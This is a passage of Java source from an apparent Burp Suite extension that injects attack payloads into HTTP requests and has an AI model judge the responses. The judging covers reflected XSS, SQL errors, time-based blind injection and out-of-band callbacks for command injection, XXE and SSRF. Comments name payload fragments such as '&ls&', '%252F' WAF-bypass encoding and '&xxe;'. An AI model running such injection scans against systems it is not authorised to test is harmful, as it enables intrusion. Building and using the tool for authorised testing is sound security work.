            if (content.trim().isEmpty()) {
                // content 是空串 —— 这**不是**「回复里没有 JSON」，是模型根本没给出可见答案。
                // 实测（2026-09-27）这条日志原本被归进 noJson，片段是空的，看着像拒答其实不是。
                // 最常见的原因是思维链把 max_tokens 吃光了（见 buildAIRequest 里那段预算注释），
                // 所以必须把 finish_reason 和有无思维链带出去，否则只能靠猜。
                this.setVerifyFailReason(Msg.t("verify.fail.emptyContent") + this.envelopeHint(result));
                return null;
            }
            JsonObject verifyResult = this.normalizeVerifyResponse(content, vulnType);
            if (verifyResult == null) {
                // 模型回了一段说明/拒绝的话，里面没有 JSON。把回复头部带出去，
                // 否则这一类和「网络抖动」在日志里完全分不开。
                this.setVerifyFailReason(Msg.t("verify.fail.noJson")
                        + this.envelopeHint(result)
                        + Msg.t("verify.fail.snippet", loggablePayload(content)));
                return null;
            }
            return verifyResult;
        }
        catch (Exception e) {
            this.logPanel.logError(Msg.t("log.verify.exception"), e);
            this.setVerifyFailReason(Msg.t("verify.fail.exception", e.getClass().getSimpleName()));
            return null;
        }
    }

    /**
     * 从响应信封里取两个决定性字段，附在失败原因后面 —— 回复为空或解析不出时，这两样是唯一能
     * 把原因钉死的东西，没有它们就只剩猜：
     *
     * <ul>
     *   <li>{@code finish_reason}：是 {@code length} 就说明输出被额度截断了（思维链吃光 max_tokens
     *       是最常见的一种，见 {@code buildAIRequest} 里那段预算注释）；</li>
     *   <li>有没有 {@code reasoning_content}：有就说明这是个思维链模型，而思考与可见输出**共用**
     *       同一个 max_tokens —— 这正是「可见答案为空白」的成因。</li>
     * </ul>
     *
     * <p>信封形状不认识时返回空串，不影响主流程。只读不写，任何异常都吞掉。
     */
    private String envelopeHint(JsonObject envelope) {
        if (envelope == null) {
            return "";
        }
        StringBuilder hint = new StringBuilder();
        try {
            JsonArray choices = envelope.getAsJsonArray("choices");
            if (choices == null || choices.size() == 0 || !choices.get(0).isJsonObject()) {
                return "";
            }
            JsonObject first = choices.get(0).getAsJsonObject();
            if (first.has("finish_reason") && !first.get("finish_reason").isJsonNull()) {
                hint.append(Msg.t("verify.fail.finishReason", first.get("finish_reason").getAsString()));
            }
            if (first.has("message") && first.get("message").isJsonObject()) {
                JsonObject message = first.getAsJsonObject("message");
                if (message.has("reasoning_content") && !message.get("reasoning_content").isJsonNull()) {
                    hint.append(Msg.t("verify.fail.hasReasoning",
                            message.get("reasoning_content").getAsString().length()));
                }
            }
        } catch (Exception ignore) {
            // 拿不到线索不是错误，别让它把一次验证失败变成一次崩溃
        }
        return hint.toString();
    }

    /**
     * 长文本截断，但**保证证据区落在窗口内**。
     *
     * <p>只截头部会系统性漏报：回显型漏洞（XSS 反射、SQL 报错、路径泄露）的证据常落在页面深处
     * （实测 40KB 页面里载荷在第 25010 字符处 —— 任何不锚定的窗口都只看得到无差异的页头，
     * 模型于是按「与基线一致」判成没有漏洞）。这里以 anchor 为锚点取窗口，
     * 并把「前面略过了多少、关键位置在哪」写清楚，让模型知道自己在看片段。
     *
     * @param anchor 证据位置（响应里载荷出现处、或与基线首个不同处）；&lt;0 表示没有锚点，按头部截断
     */
    private static String excerptForPrompt(String text, int limit, int anchor) {
        if (text == null) return "";
        if (text.length() <= limit) return text;
        int from = anchor < 0 ? 0 : Math.max(0, anchor - limit / 4);
        if (from + limit > text.length()) {
            from = Math.max(0, text.length() - limit);
        }
        StringBuilder sb = new StringBuilder();
        if (from > 0) {
            sb.append("…（前 ").append(from).append(" 字符略）…\n");
        }
        sb.append(text, from, Math.min(text.length(), from + limit));
        sb.append("\n…（原文共 ").append(text.length()).append(" 字符");
        if (anchor >= 0) {
            sb.append("，关键位置在第 ").append(anchor).append(" 字符处");
        }
        sb.append("）…");
        return sb.toString();
    }

    /**
     * 证据锚点：载荷在响应里的位置；找不到就退回「与基线首个不同的字符位置」。
     * 两个都找不到（响应里既没有载荷、也与基线一致）时返回 -1，按头部截断。
     */
    private static int evidenceAnchor(String response, String payload, byte[] baseline) {
        if (response == null || response.isEmpty()) return -1;
        if (payload != null && !payload.isEmpty()) {
            int at = response.indexOf(payload);
            if (at >= 0) return at;
            // 目标可能把载荷转义/截断后回显，退一步用它的前缀找
            int probeLen = Math.min(payload.length(), 24);
            if (probeLen >= 6) {
                at = response.indexOf(payload.substring(0, probeLen));
                if (at >= 0) return at;
            }
        }
        if (baseline != null && baseline.length > 0) {
            // 两侧都要剥易变响应头再比：只剥一侧的话，首个不同处必然还是 Date 头那一行，
            // 窗口就又锚到页面头部去了（见 VOLATILE_HEADER_NAMES）
            String base = volatileHeadersMaskedText(new String(baseline, StandardCharsets.UTF_8));
            String resp = volatileHeadersMaskedText(response);
            int n = Math.min(base.length(), resp.length());
            for (int i = 0; i < n; i++) {
                if (base.charAt(i) != resp.charAt(i)) return i;
            }
        }
        return -1;
    }

    /**
     * 响应耗时对照。时间盲注（SLEEP/BENCHMARK）只能靠这个判定 ——
     * 此前验证提示词里没有任何耗时信息，模型却被要求判断「响应时间是否 >=5 秒」。
     */
    private String buildTimingBlock(ScanTask task, long elapsedMs) {
        long baseline = task != null ? task.getOriginalResponseMillis() : -1L;
        StringBuilder sb = new StringBuilder("【响应耗时】\n");
        sb.append("本次测试：").append(elapsedMs).append(" ms\n");
        if (baseline > 0) {
            long delta = elapsedMs - baseline;
            sb.append("原始请求基线：").append(baseline).append(" ms\n");
            sb.append("差值：").append(delta >= 0 ? "+" : "").append(delta).append(" ms\n");
            sb.append("（差值显著为正且稳定，才可作为时间盲注证据；接口本身慢不算）\n");
        } else {
            sb.append("原始请求基线：未采集（无法用耗时做判据，时间盲注类结论请按证据不足处理）\n");
        }
        return sb.append("\n").toString();
    }

    /**
     * 外带回连记录 —— 「无回显」类漏洞（命令注入外带、Blind XXE、SSRF 出网）唯一的证据来源。
     *
     * <p>四种形态必须让模型分得清，否则它会去猜一个自己看不到的东西（此前提示词里直接写着
     * 「dnslog.cn 有记录」，而程序根本没有查询能力）：本次载荷不需要外带（不适用）；
     * 拿不到回连域名（不可用）；本次请求的域名没有被解析（无，是有效的反向证据）；有记录。
     */
    private String buildOastBlock(OobProbe oob) {
        if (oob == null) {
            return "【外带回连记录】\n本次载荷没有使用回连域名（这条载荷本来就不依赖外带证据），外带类证据不适用。\n\n";
        }
        if (oob.failure != null) {
            return "【外带回连记录】\n" + oob.failure
                    + "。任何「目标向外部发起请求」类的证据都不可用；只能靠外带确认的载荷一律按证据不足处理。\n\n";
        }
        if (oob.records == null || oob.records.isEmpty()) {
            return "【外带回连记录】\n无 —— 目标没有解析本次请求的域名 "
                    + oob.label + "." + oob.domain + "。\n\n";
        }
        StringBuilder sb = new StringBuilder("【外带回连记录】\n");
        for (String record : oob.records) {
            sb.append("- ").append(record).append("\n");
        }
        sb.append("（前缀 ").append(oob.label).append(" 是本次请求专用的随机标记而非命令输出；"
                + "有一条记录即表示目标解析了该域名、载荷确实被执行，可作为外带类漏洞的直接证据）\n\n");
        return sb.toString();
    }

    /** 一条载荷的外带探测结果；不涉及外带的载荷为 null */
    private static class OobProbe {
        /** 本次请求的随机前缀，形如 3f9ac1d2 */
        String label;
        /** 本次会话的回连域名 */
        String domain;
        /** 非 null 表示外带通道不可用（没拿到域名） */
        String failure;
        /** 按前缀查到的回连记录，发送后填入 */
        List<String> records;
    }

    /** 回连域名只在变化时打一行日志（插件加载时已经申请过一次，每个任务都打就太吵了） */
    private void logOastDomain(String host, String error) {
        if (host == null) {
            this.logPanel.logWarning(Msg.t("log.oob.noHost", error));
            this.lastLoggedOastHost = null;
            return;
        }
        if (host.equals(this.lastLoggedOastHost)) return;
        this.lastLoggedOastHost = host;
        this.logPanel.logInfo(Msg.t("log.oob.host", host));
    }

    /** 基线响应：模型要靠「相对基线发生了什么变化」判断，而不是凭单次响应猜 */
    private String buildBaselineBlock(ScanTask task, int anchor) {
        byte[] baseline = task != null ? task.getOriginalResponseBytes() : null;
        if (baseline == null || baseline.length == 0) {
            return "【原始请求的响应（基线）】\n未采集到基线响应，本次无法做差异对比。\n\n";
        }
        String text = new String(baseline, StandardCharsets.UTF_8);
        // 基线用同一个锚点取窗口：否则「本次响应里载荷在第 25010 字符」而基线只给了头部，
        // 两边根本不是同一段内容，差异对比无从谈起
        return "【原始请求的响应（基线，未注入任何载荷）】\n" + excerptForPrompt(text, VERIFY_WINDOW, anchor) + "\n\n";
    }
    
    private JsonObject normalizeVerifyResponse(String content, String defaultVulnType) {
        if (content == null || content.trim().isEmpty()) {
            return null;
        }
        try {
            String jsonStr = extractJsonFromContent(content);
            if (jsonStr == null || jsonStr.trim().isEmpty()) {
                return null;
            }
            JsonObject aiResult;
            try {
                aiResult = this.gson.fromJson(jsonStr, JsonObject.class);
            } catch (Exception e) {
                String fixed = fixIncompleteJson(jsonStr);
                if (fixed != null) {
                    try {
                        aiResult = this.gson.fromJson(fixed, JsonObject.class);
                    } catch (Exception e2) {
                        return null;
                    }
                } else {
                    return null;
                }
            }
            
            if (aiResult == null) {
                return null;
            }
            
            JsonObject result = new JsonObject();
            
            Boolean vulnerable = findBooleanField(aiResult, "vulnerable", "isVulnerable", "is_vulnerable", "isVuln", "is_vuln", "result", "isExploit", "hasVuln", "flag", "success");
            if (vulnerable != null) {
                result.addProperty("vulnerable", vulnerable);
            } else {
                result.addProperty("vulnerable", false);
            }
            
            Integer confidence = findIntField(aiResult, "confidence", "confidence_score", "score", "rate", "probability", "confidenceValue", "level");
            if (confidence != null) {
                result.addProperty("confidence", clampConfidence(confidence));
            } else {
                result.addProperty("confidence", 0);
            }
            
            String vulnType = findStringField(aiResult, "vulnType", "vuln_type", "type", "vulnerability_type", "attackType", "category", "vulnerabilityType", "vuln_name");
            if (vulnType != null) {
                result.addProperty("vulnType", vulnType);
            } else {
                result.addProperty("vulnType", defaultVulnType != null ? defaultVulnType : "UNKNOWN");
            }
            
            String level = findStringField(aiResult, "level", "severity", "risk_level", "vulnerability_level", "risk", "severity_level", "priority");
            if (level != null) {
                result.addProperty("level", level);
            } else {
                result.addProperty("level", "LOW");
            }
            
            String description = findStringField(aiResult, "description", "reason", "evidence", "detail", "details", "explanation", "message", "reasoning", "analysis");
            if (description != null) {
                result.addProperty("description", description);
            } else {
                result.addProperty("description", "AI未提供详细描述");
            }
            
            String tag = findStringField(aiResult, "tag", "name", "vulnerability_name", "vuln_name", "title", "vulnName", "label");
            if (tag != null) {
                result.addProperty("tag", tag);
            } else {
                result.addProperty("tag", defaultVulnType != null ? defaultVulnType : "UNKNOWN");
            }
            
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 一条待做的外带验证：发送时把上下文全部记下来，
     * 等 OOB_POLL_DELAY_SECONDS 的窗口过去后，由后台线程查回连记录并判定。
     * 之所以要单独存一份：扫描线程早就在处理后面的载荷了，这些局部变量它自己不会再读第二次。
     */
    private static class PendingOobVerify {
        final ScanTask task;
        final IHttpRequestResponse testResponse;
        final int totalPayloads;
        final String vulnType;
        final String testData;
        final String position;
        final long elapsedMs;
        final OobProbe oob;
        /** 界面上显示用的序号（从 1 起） */
        final int displayIndex;
        /** 「无差异跳过验证」的跨线程计数（收尾摘要要用） */
        final java.util.concurrent.atomic.AtomicInteger noDiffSkips;
        /**
         * 各组合的对照锚点（引用直接传，不拷贝）：**故意晚绑定** —— 到点验证时再按位置键取，
         * 此时那个组合的探测载荷早已记进去了。拿快照反而多一层要维护的一致性。
         */
        final Map<String, ProbeAnchor> probeAnchors;
        /** 本次扫描的请求字节：对照锚点键里要按它折 cookie 名与 multipart 部件名 */
        final byte[] requestBytes;

        PendingOobVerify(ScanTask task, IHttpRequestResponse testResponse, int totalPayloads,
                         String vulnType, String testData, String position, long elapsedMs,
                         OobProbe oob, int displayIndex, java.util.concurrent.atomic.AtomicInteger noDiffSkips,
                         Map<String, ProbeAnchor> probeAnchors, byte[] requestBytes) {
            this.task = task;
            this.testResponse = testResponse;
            this.totalPayloads = totalPayloads;
            this.vulnType = vulnType;
            this.testData = testData;
            this.position = position;
            this.elapsedMs = elapsedMs;
            this.oob = oob;
            this.displayIndex = displayIndex;
            this.noDiffSkips = noDiffSkips;
            this.probeAnchors = probeAnchors;
            this.requestBytes = requestBytes;
        }
    }

    /**
     * 查一次回连记录（只一次）：
     * 「查到但没有记录」不再补查 —— 每条约定的那一次就是全部（策略定稿见 {@link #OOB_POLL_DELAY_SECONDS}）。
     * —— 单独调客户端 API 的夹具钉不住「扫描路径到底用没用这个策略」。
     */
    OASTClient.PollResult pollForCallback(OASTClient oast, OASTClient.Session session, String label) {
        return oast.pollInteractionsWithError(session, label);
    }

    /**
     * 延后的外带验证：查回连记录 → 交给 AI 验证。
     * 跑在 oobScheduler 上，所以这里碰的共享状态必须是有同步保护的
     * （漏洞/探针列表是写时复制列表，日志走 EDT）。
     */
    private void runPendingOobVerify(PendingOobVerify job, OASTClient oast, OASTClient.Session session) {
        try {
            // 任务已被取消就不再查/不再验证：取消是协作式的，这里是最快能停下来的点
            if (job.task.isCancelled()) {
                return;
            }
            // 失败原因用本次调用返回的那份，不读共享的 lastError（并发任务会互相覆盖，
            // 会把一次成功的查询误判成失败、或把失败洗成「无记录」= 无效的反向证据）
            OASTClient.PollResult poll = this.pollForCallback(oast, session, job.oob.label);
            job.oob.records = poll.records;
            if (poll.error != null) {
                this.logPanel.logWarning(Msg.t("log.oob.tag", poll.error));
                // 查询失败必须让验证阶段知道「这条不是反向证据」：否则 buildOastBlock 会写成
                // 「无 —— 目标没有解析本次请求的域名」，把一次失败当成目标没回连，真漏洞就这么被否掉
                job.oob.failure = Msg.t("oob.pollFailureNote", poll.error);
            } else if (!job.oob.records.isEmpty()) {
                this.logPanel.logSuccess(Msg.t("log.oob.records", job.displayIndex, job.oob.records.size(), job.oob.label));
            }
            this.processTestResult(job.task, job.testResponse, job.displayIndex, job.totalPayloads,
                    job.vulnType, job.testData, job.position, job.elapsedMs, job.oob, job.noDiffSkips,
                    job.probeAnchors, job.requestBytes);
        } catch (Exception e) {
            // 调度线程里抛异常会被静默吞掉：这里必须自己记一笔，否则载荷就这么无声无息地丢了
            this.logPanel.logError(Msg.t("log.oob.verifyError", job.displayIndex, job.position), e);
        }
    }

    /**
     * 等所有延后的外带验证结束，然后关掉调度器（正常路径的收尾）。
     * 必须在任务总结之前调用 —— 外带漏洞要等判定落地，否则总结会先说「未发现漏洞」。
     * 没有在途验证时也要走一遍（等于直接关掉调度器），别让「关调度器」变成调用方的隐性责任。
     *
     * <p>**不设等待上限**：外带判定现在每条只剩一次 HTTP 查询（有记录直接判、不再挂 AI 调用），
     * 等待时间就是「还剩几条 × 单次查询耗时」，通常几十毫秒一条。以前那个 185 秒上限是为了不让
     * 被 AI 拖住的队列卡住收尾，代价是到点直接 cancel、把靠后载荷的结论丢掉 —— 现在不需要这个取舍了。
     */
    private void awaitOobVerifications(List<Future<?>> futures, ScheduledExecutorService scheduler) {
        for (Future<?> f : futures) {
            try {
                f.get();
            } catch (ExecutionException e) {
                // runPendingOobVerify 已经自己记了日志，这里只保证不影响后面的任务总结
                this.logPanel.logWarning(Msg.t("log.oob.asyncError", e.getCause()));
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
        scheduler.shutdownNow();
    }

    /**
     * 「包发出去了，但没拿到响应」时用的那份请求（超时 / Burp 返回 null / 发送异常）。
     *
     * <p>存在的理由只有一个：**探针记录与详情面板要能看到发出去的是什么包**。以前这三种情况
     * {@code sendTestRequest} 返回 null，调用方按「没发出去」处理 —— 详情面板里连请求都没有，
     * 而超时的载荷恰恰是最需要人眼看一眼的（到底把什么打过去了、目标为什么没回）。
     *
     * <p>不可变，setter 一律抛异常：这里存的是**已经发出去的字节**，事后被谁改一下，日志、
     * 报告与详情面板就各说各话了。响应恒为 {@code null}（本来就没有）。
     */
    static final class SentRequest implements IHttpRequestResponse {
        private final byte[] request;
        private final IHttpService service;

        SentRequest(byte[] request, IHttpService service) {
            this.request = request;
            this.service = service;
        }

        @Override
        public byte[] getRequest() {
            return this.request;
        }

        @Override
        public byte[] getResponse() {
            return null;
        }

        @Override
        public IHttpService getHttpService() {
            return this.service;
        }

        @Override
        public String getComment() {
            return null;
        }

        @Override
        public String getHighlight() {
            return null;
        }

        @Override
        public void setRequest(byte[] message) {
            throw new UnsupportedOperationException(Msg.t("err.sentRequestImmutable"));
        }

        @Override
        public void setResponse(byte[] message) {
            throw new UnsupportedOperationException(Msg.t("err.sentRequestImmutable"));
        }

        @Override
        public void setHttpService(IHttpService httpService) {
            throw new UnsupportedOperationException(Msg.t("err.sentRequestImmutable"));
        }

        @Override
        public void setComment(String comment) {
            throw new UnsupportedOperationException(Msg.t("err.sentRequestImmutable"));
        }

        @Override
        public void setHighlight(String color) {
            throw new UnsupportedOperationException(Msg.t("err.sentRequestImmutable"));
        }
    }

    /** 一次测试发送的结果：响应本身 + 实际耗时（毫秒），耗时为时间盲注判定所需 */
    private static class TestSendResult {
        final IHttpRequestResponse response;
        final long elapsedMs;
        TestSendResult(IHttpRequestResponse response, long elapsedMs) {
            this.response = response;
            this.elapsedMs = elapsedMs;
        }
    }

    /**
     * 步骤1 的重放：发原始请求拿基线，**带与载荷发送同一个上限**
     * （{@link #TEST_REQUEST_TIMEOUT_SECONDS}，靠看门狗线程实现 —— Burp 的
     * `makeHttpRequest` 没有我们设得上的超时，可能无限阻塞）。
     *
     * <p>为什么补这一层：以前只有步骤4 的载荷有看门狗，重放是裸调 —— 目标不响应时任务会一直卡到
     * Burp 自己的超时（默认可达分钟级），而这期间日志上只有一行「正在发送原始请求到目标...」，
     * 看起来就是卡死了，用户既不知道要等多久、也没有取消以外的选择。
     *
     * <p>超时与「Burp 返回 null」在这里**合成同一条路**：两者都没有基线，调用方的分支一样
     *（记「无响应」并提前收尾），区别只在那句告警文案上。
     *
     * @param timeoutMillis 上限；生产路径传 {@link #TEST_REQUEST_TIMEOUT_SECONDS}（与载荷发送同一个上限），
     *                      做成参数是为了能被离线自检用一个很短的窗口钉住「到点真的会走」
     * @return 响应；超时 / Burp 返回 null / 抛异常一律返回 null
     */
    private IHttpRequestResponse replayWithTimeout(IHttpService httpService, byte[] request, long timeoutMillis) {
        final IHttpRequestResponse[] result = new IHttpRequestResponse[1];
        Thread worker = new Thread(() -> {
            try {
                result[0] = this.callbacks.makeHttpRequest(httpService, request);
            }
            catch (Throwable ignored) {
                // 与 Burp 返回 null 同等对待：都是「没拿到基线」。真正的处理在调用方那三个分支里
            }
        });
        worker.setName("Step1-Replay");
        worker.setDaemon(true);
        worker.start();
        try {
            worker.join(timeoutMillis);
        }
        catch (InterruptedException e) {
            worker.interrupt();
            Thread.currentThread().interrupt();
            return null;
        }
        if (worker.isAlive()) {
            // 放弃等待：包已经交给 Burp 了，但结局未知 —— 按「无响应」处理（不再有基线）
            worker.interrupt();
            this.logPanel.logWarning(Msg.t("log.step1.timeout", TEST_REQUEST_TIMEOUT_SECONDS));
            return null;
        }
        return result[0];
    }

    private TestSendResult sendTestRequest(IHttpRequestResponse original, String payload, String position) {
        try {
            String processedPayload = payload;
            IRequestInfo reqInfo = this.helpers.analyzeRequest(original.getRequest());
            // URL 查询参数 / urlencoded body 里的载荷是「参数值」，值里的结构字符必须编码，
            // 否则服务端会把它当结构：& 会拆出新参数（命令注入的 &ls& 整条失效）、
            // # 在部分链路上被当片段、+ 会被表单规则解成空格。
            // 只编这三个：% = ; ' " < > 一律保持原样 —— 载荷本身就常依赖百分号编码
            //（SQL 的 %27、WAF 绕过的 %252F），再编一次就变成没有攻击含义的字面量了。
            // 只看位置类型，不看方法：POST 也可以把待测参数放在 URL 查询串里，
            // 以前要求 GET 会让这类位置的载荷既不编码 & 也不转空格
            boolean urlQueryPosition = this.isUrlQueryPosition(reqInfo, position);
            if (urlQueryPosition) {
                processedPayload = encodeParamValue(payload).replace(" ", "+");
            } else if (this.isFormBodyPosition(reqInfo, position)) {
                // 表单 body 与 URL 查询串是同一套编码规则（`+` 就是空格），以前只编 & # +、
                // 空格原样发出去 —— 严格一点的解析器会把它当非法字符，而这一步本来就该与
                // URL 查询位置一致（两个位置在提示词里也是同一类「参数值」位置）
                processedPayload = encodeParamValue(payload).replace(" ", "+");
            } else if (this.isCookieValuePosition(reqInfo, position)) {
                // cookie 值是唯一「住在请求头里却走了参数注入」的位置（见 sanitizeCookieValue）：
                // 空格会让严格解析器把整个 cookie 丢掉、换行会伪造出新请求头
                processedPayload = sanitizeCookieValue(payload);
            }
            byte[] modifiedRequest = this.modifyRequest(original.getRequest(), processedPayload, position);
            if (modifiedRequest == null) {
                this.logPanel.logWarning(Msg.t("log.send.cannotInject", position, loggablePayload(payload)));
                return null;
            }
            IHttpService httpService = original.getHttpService();
            if (httpService == null) {
                this.reportError(Msg.t("log.send.noHttpService", position, loggablePayload(payload)));
                this.logPanel.logError(Msg.t("log.send.noHttpServiceShort"));
                return null;
            }
            final IHttpRequestResponse[] result = new IHttpRequestResponse[1];
            final Throwable[] error = new Throwable[1];
            final long[] elapsed = new long[1];
            Thread worker = new Thread(() -> {
                try {
                    long sendStart = System.currentTimeMillis();
                    result[0] = this.callbacks.makeHttpRequest(httpService, modifiedRequest);
                    elapsed[0] = System.currentTimeMillis() - sendStart;
                } catch (Throwable t) {
                    error[0] = t;
                }
            });
            worker.setName("TestRequest-" + position);
            worker.setDaemon(true);
            worker.start();
            try {
                worker.join(TEST_REQUEST_TIMEOUT_SECONDS * 1000L);
            } catch (InterruptedException e) {
                worker.interrupt();
                this.logPanel.logWarning(Msg.t("log.send.threadInterrupted", position, loggablePayload(payload)));
                return null;
            }
            // 以下三条都是「包已经交给 Burp 了，但没拿到响应」。**它们不再返回 null**：
            // 返回 null 等于告诉调用方「这条载荷压根没发出去」，于是连探针记录都不建 ——
            // 详情面板里什么都看不到（用户 2026-09-24 反馈：超时后请求与响应详情是空的）。
            // 现在一律返回一个只带「发出去的那份请求」的结果：记录照样建、详情里看得到包，
            // 而没有响应体时 processTestResult 会记一行「无响应」结论并跳过 AI 验证。
            if (worker.isAlive()) {
                worker.interrupt();
                try {
                    worker.join(1000);
                } catch (InterruptedException e) {
                }
                this.logPanel.logWarning(Msg.t("log.send.timeout", TEST_REQUEST_TIMEOUT_SECONDS, position, loggablePayload(payload)));
                // 耗时只知道下界（超时值）：这条不会再走到用耗时判定那一步（没有响应体就早退了）
                return new TestSendResult(new SentRequest(modifiedRequest, httpService),
                        TEST_REQUEST_TIMEOUT_SECONDS * 1000L);
            }
            if (error[0] != null) {
                this.logPanel.logError(Msg.t("log.send.failed", error[0].getClass().getSimpleName(), position, loggablePayload(payload)));
                return new TestSendResult(new SentRequest(modifiedRequest, httpService), elapsed[0]);
            }
            if (result[0] == null) {
                // Burp 在目标不可达/被拦截时返回 null：请求确实发出去了，同样要留下记录
                return new TestSendResult(new SentRequest(modifiedRequest, httpService), elapsed[0]);
            }
            return new TestSendResult(result[0], elapsed[0]);
        }
        catch (Exception e) {
            this.logPanel.logError(Msg.t("log.send.testFailed", e.getClass().getSimpleName(), position), e);
            return null;
        }
    }

    /**
     * 按 position 注入载荷。
     * 返回 null 表示「无法注入」——调用方据此跳过本次测试，绝不能把未修改的原包当成测试包发出去。
     * 分派顺序：header 位置 → 整段 body 替换 → 按 Content-Type 分派参数注入 → 都不匹配就返回 null。
     * **没有兜底那一层**：旧版找不到注入点时会拿第一个非敏感参数硬打，那是静默改靶
     *（载荷看起来投给 A、实际打进 B），是错位注入与误报的主要来源，代码已于 2026-09-27 移除。
     */
    private byte[] modifyRequest(byte[] originalRequest, String payload, String position) {
        try {
            if (position == null || position.trim().isEmpty()) {
                return null;
            }
            String trimmedPosition = position.trim();
            IRequestInfo requestInfo = this.helpers.analyzeRequest(originalRequest);
            String contentType = this.getContentType(requestInfo);

            // 1) header 位置：显式 header:Name 语法，或裸名命中 header 白名单且不是请求里真实的参数名
            String headerName = stripHeaderPrefix(trimmedPosition);
            boolean explicitHeaderSyntax = !headerName.equals(trimmedPosition);
            boolean matchesRealParam = this.matchesParameterName(requestInfo, trimmedPosition);
            if (explicitHeaderSyntax || (!matchesRealParam && isInjectableHeader(headerName))) {
                if (isHeaderParameter(headerName)) {
                    this.logPanel.logWarning(Msg.t("log.send.stdHeaderBlocked", trimmedPosition));
                    return null;
                }
                return this.modifyHeaderParameter(originalRequest, payload, headerName);
            }

            // 2) 整段 body 替换（请求里真有同名参数时，按「具体目标优先」仍走参数注入）
            if (trimmedPosition.equalsIgnoreCase(WHOLE_BODY_POSITION) && !matchesRealParam) {
                return this.alignBodyContentType(this.replaceWholeBody(originalRequest, payload, requestInfo),
                        payload, requestInfo);
            }

            // 2.5) URL 路径段（REST 风格 /user/123 这类注入点，没有参数名可匹配）。
            // 真存在同名参数时按具体目标优先，与 BODY 的规则一致。
            if (isUrlPathPosition(trimmedPosition) && !matchesRealParam) {
                byte[] pathResult = this.modifyUrlPath(originalRequest, payload, trimmedPosition);
                if (pathResult == null) {
                    this.logPanel.logWarning(Msg.t("log.send.noSuchPathSegment", trimmedPosition));
                }
                return pathResult;
            }

            // 3) 按 Content-Type 分派参数注入（子方法返回 null 表示该类型下注入不了，继续往下试）
            if (isJsonContentType(contentType)) {
                byte[] jsonResult = this.modifyJsonRequest(originalRequest, payload, trimmedPosition, requestInfo);
                if (jsonResult != null) return jsonResult;
            } else if (isXmlContentType(contentType)) {
                byte[] xmlResult = this.modifyXmlRequest(originalRequest, payload, trimmedPosition, requestInfo);
                if (xmlResult != null) return xmlResult;
            } else if (isMultipartContentType(contentType)) {
                byte[] multipartResult = this.modifyMultipartRequest(originalRequest, payload, trimmedPosition, requestInfo, contentType);
                if (multipartResult != null) return multipartResult;
            }

            // 4) 通用参数注入：urlencoded body / URL 查询参数 / Cookie 等 Burp 能识别的参数
            byte[] paramResult = this.modifyParameter(originalRequest, payload, trimmedPosition, requestInfo);
            if (paramResult != null) return paramResult;

            this.logPanel.logWarning(Msg.t("log.send.positionMissing", trimmedPosition));
            return null;
        }
        catch (Exception e) {
            this.logPanel.logError(Msg.t("log.send.modifyError", e.getClass().getSimpleName()), e);
            return null;
        }
    }

    private boolean matchesParameterName(IRequestInfo requestInfo, String position) {
        if (requestInfo == null || position == null) return false;
        List<IParameter> parameters = requestInfo.getParameters();
        if (parameters == null) return false;
        for (IParameter param : parameters) {
            if (param != null && param.getName() != null && param.getName().equalsIgnoreCase(position)) {
                return true;
            }
        }
        return false;
    }

    /** 通用参数注入：按大小写不敏感匹配参数名，用 Burp 的 updateParameter 替换其值 */
    private byte[] modifyParameter(byte[] originalRequest, String payload, String position, IRequestInfo requestInfo) {
        List<IParameter> parameters = requestInfo.getParameters();
        if (parameters == null || parameters.isEmpty()) return null;
        for (IParameter param : parameters) {
            if (param == null || param.getName() == null) continue;
            if (!param.getName().equalsIgnoreCase(position)) continue;
            byte paramType = param.getType();
            // multipart 部件绝不能走参数替换：Burp 的 updateParameter 会把整个 part 值区间重写，
            // 连 Content-Disposition 里的 filename= 和 Content-Type 一起吃掉 —— 请求从「文件上传」
            // 变成「普通表单字段」（服务端 request.files 直接是空的），这种请求**不可能证明任何东西**，
            // 却因为载荷确实原样写进去了，下面那道「有没有原样写入」的校验也拦不住它，
            // 结果是发出去一串永远只能得到「未发现漏洞」的包。
            // 部件一律交给 modifyMultipartRequest（按 part 边界写字节，不碰 part 头结构）。
            // 判据取两种：真实 Burp 把部件报成 PARAM_MULTIPART_ATTR（离线桩按 PARAM_BODY 报，
            // 两种都得挡住）。只挡这两个类型，URL 查询参数（multipart 请求同样可能有）不受影响。
            boolean multipartPart = paramType == IParameter.PARAM_MULTIPART_ATTR
                    || (paramType == IParameter.PARAM_BODY
                        && isMultipartContentType(this.getContentType(requestInfo)));
            if (multipartPart) {
                this.logPanel.logParam(Msg.t("log.inject.multipartSkip", position));
                return null;
            }
            if (!param.getName().equals(position)) {
                this.logPanel.logParam(Msg.t("log.inject.caseDiffers", position, param.getName()));
            }
            try {
                byte[] updated = this.helpers.updateParameter(originalRequest,
                        this.helpers.buildParameter(param.getName(), payload, paramType));
                if (updated == null) {
                    return null;
                }
                // 「写进去了没有」必须自己验一遍：Burp 的参数更新只对 URL/BODY/COOKIE 有明确保证，
                // 其它类型（JSON / XML / MULTIPART_ATTR）可能**接受但不写**，也可能按自己的规则
                // 转义（把 &xxe; 写成 &amp;xxe; 之类）。那样发出去的就是原始请求、或一条被改成
                // 字面量的载荷 —— 前者违反「绝不发未修改的请求」，后者是静默漏报。
                // 载荷没原样出现在新请求里就按注入失败处理，交给调用方的专用注入器
                // （JSON 路径 / XML 元素文本 / multipart 部件）去试 —— 那几条路径都是自己写字节的。
                if (!payload.isEmpty() && indexOfBytes(updated, payload.getBytes(StandardCharsets.UTF_8),
                        0, updated.length) < 0) {
                    this.logPanel.logWarning(Msg.t("log.inject.burpDidNotWrite", paramType, position));
                    return null;
                }
                return updated;
            }
            catch (Exception paramEx) {
                this.logPanel.logError(Msg.t("log.inject.paramUpdateFailed", param.getName(), paramType), paramEx);
                return null;
            }
        }
        return null;
    }

    /**
     * 整段替换 body 时，把 Content-Type 与请求体的实际形态对齐。
     *
     * <p>为什么要做：抓到的请求常常「头是表单、体是 JSON」（浏览器/Repeater 里改过 body 但没改头，
     * 实测靶场就是这么来的）。这时框架**根本不会把 body 交给 JSON 解析器**——
     * Spring 按 form-urlencoded 解析后 fastjson 拿到的是空串，报
     * {@code syntax error, expect {, actual error, pos 0}，于是我们 9 条载荷一条都没进到解析器，
     * 全被 400 挡在门外（而正文里明明写着 fastjson-version 1.2.45）。
     *
     * <p>只在「当前 Content-Type 明显不适合这份文档」时才改：缺失、{@code application/x-www-form-urlencoded}、
     * {@code multipart/form-data}、{@code text/plain}。已经是 json/xml 家族（含 {@code application/graphql}、
